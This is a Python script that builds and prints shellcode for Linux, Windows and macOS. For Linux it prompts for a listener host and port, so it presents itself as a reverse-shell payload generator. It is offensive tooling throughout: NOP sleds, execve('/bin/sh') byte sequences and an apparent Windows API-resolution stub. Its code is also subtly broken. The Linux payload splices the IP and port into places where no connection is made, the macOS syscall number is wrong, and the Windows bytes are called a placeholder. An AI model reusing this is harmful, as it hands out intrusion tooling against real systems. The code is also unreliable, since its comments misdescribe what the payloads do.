import socket
import struct

def create_linux_shell_code(listener_host, listener_port):
    # Convert listener host to bytes
    listener_host_bytes = socket.inet_aton(listener_host)

    # Convert listener port to bytes in network byte order (big-endian)
    listener_port_bytes = struct.pack('>H', listener_port)

    # Create a heavier Linux shellcode with additional instructions and NOP sleds
    shell_code = (
        b"\x90" * 50 +  # NOP sled (50 bytes of no-operation instructions)
        b"\x31\xc0"      # xor eax,eax
        b"\x50"          # push eax
        b"\x68" + listener_host_bytes +  # push listener host
        b"\x68\x2f\x2f\x73\x68"  # push "//sh"
        b"\x68\x2f\x62\x69\x6e"  # push "/bin"
        b"\x89\xe3"      # mov ebx,esp
        b"\x50"          # push eax
        b"\x89\xe2"      # mov edx,esp
        b"\x53"          # push ebx
        b"\x89\xe1"      # mov ecx,esp
        b"\xb0\x0b"      # mov al,11 (execve syscall)
        b"\xcd\x80"      # int 0x80 (call kernel)
        b"\x90" * 30 +   # Additional NOP sled (30 bytes of no-operation instructions)
        listener_port_bytes +  # Append listener port
        b"\x00"          # Null terminator for the string
    )

    return shell_code

def create_windows_shell_code():
    # Example Windows shellcode to spawn cmd.exe (placeholder for demonstration)
    shell_code = (
        b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0"
    )
    return shell_code

def create_macos_shell_code():
    """
    macOS shellcode to spawn /bin/sh using execve system call.
    """
    shell_code = (
        b"\x90" * 50 +  # NOP sled (50 bytes of no-operation instructions)
        b"\x48\x31\xc0"      # xor rax, rax
        b"\x50"              # push rax
        b"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # mov rax, '//bin/sh'
        b"\x50"              # push rax
        b"\x48\x89\xe7"      # mov rdi, rsp
        b"\x50"              # push rax (null terminator for argv)
        b"\x57"              # push rdi (pointer to '/bin/sh')
        b"\x48\x89\xe6"      # mov rsi, rsp (argv pointer)
        b"\xb0\x3b"          # mov al, 59 (execve syscall number on macOS)
        b"\x0f\x05"          # syscall
    )
    return shell_code

def get_user_input():
    platform = input("ShellCode for Linux, Windows, or macOS: ").strip().lower()
    while platform not in ["linux", "windows", "macos"]:
        print("Invalid choice. Please enter 'Linux', 'Windows', or 'macOS'.")
        platform = input("ShellCode for Linux, Windows, or macOS: ").strip().lower()

    if platform == "linux":
        listener_host = input("Enter the listener host IP address: ")
        while True:
            try:
                listener_port = int(input("Enter the listener port (1-65535): "))
                if 1 <= listener_port <= 65535:
                    break
                else:
                    print("Port must be between 1 and 65535.")
            except ValueError:
                print("Invalid port number. Please enter a valid integer.")
    else:
        listener_host = ""
        listener_port = 0

    return platform, listener_host, listener_port

# Example usage
if __name__ == "__main__":
    platform, listener_host, listener_port = get_user_input()
    
    try:
        if platform == "linux":
            shell_code = create_linux_shell_code(listener_host, listener_port)
            print(f"Linux Shellcode ({len(shell_code)} bytes):")
            print(shell_code)
        elif platform == "windows":
            shell_code = create_windows_shell_code()
            print(f"Windows Shellcode ({len(shell_code)} bytes):")
            print(shell_code)
        elif platform == "macos":
            shell_code = create_macos_shell_code()
            print(f"macOS Shellcode ({len(shell_code)} bytes):")
            print(shell_code)
    except socket.error as e:
        print(f"Error converting host: {e}")
